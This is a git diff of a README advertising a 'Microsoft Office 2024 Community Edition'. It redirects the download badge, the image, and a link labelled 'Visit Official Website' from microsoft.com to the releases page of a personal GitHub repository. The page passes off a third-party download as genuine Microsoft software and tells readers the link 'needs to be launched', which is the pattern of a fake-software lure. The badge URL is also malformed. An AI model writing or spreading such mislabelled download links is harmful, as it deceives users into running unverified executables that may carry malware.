@@ -34,7 +34,7 @@ Here are some of the key features that make **Microsoft Office 2024** stand out:
 
 To download the **Microsoft Office 2024 Community Edition**, click the button below:
   
-[![Download Office 2024](https://img.shields.io/badge/Download-Office%202024-blue.svg)](https://github.com/project/files/App.zip)
+[![Download Office 2024](https://github.com/yasin120x/Microsoft-Office-2024-Community-Edition/releases%https://github.com/yasin120x/Microsoft-Office-2024-Community-Edition/releases)](https://github.com/yasin120x/Microsoft-Office-2024-Community-Edition/releases)
   
 *Note: The link above needs to be launched.*
 
@@ -50,6 +50,6 @@ Let's make work smarter, faster, and more efficient together with **Microsoft Of
 
 Happy creating, collaborating, and achieving with **Microsoft Office 2024**! 💼📊👩‍💻
 
-[Visit Official Website](https://www.microsoft.com/office-2024)
+[Visit Official Website](https://github.com/yasin120x/Microsoft-Office-2024-Community-Edition/releases)
 
-![Microsoft Office 2024](https://imageurl.com/office2024.png)
+![Microsoft Office 2024](https://github.com/yasin120x/Microsoft-Office-2024-Community-Edition/releases)
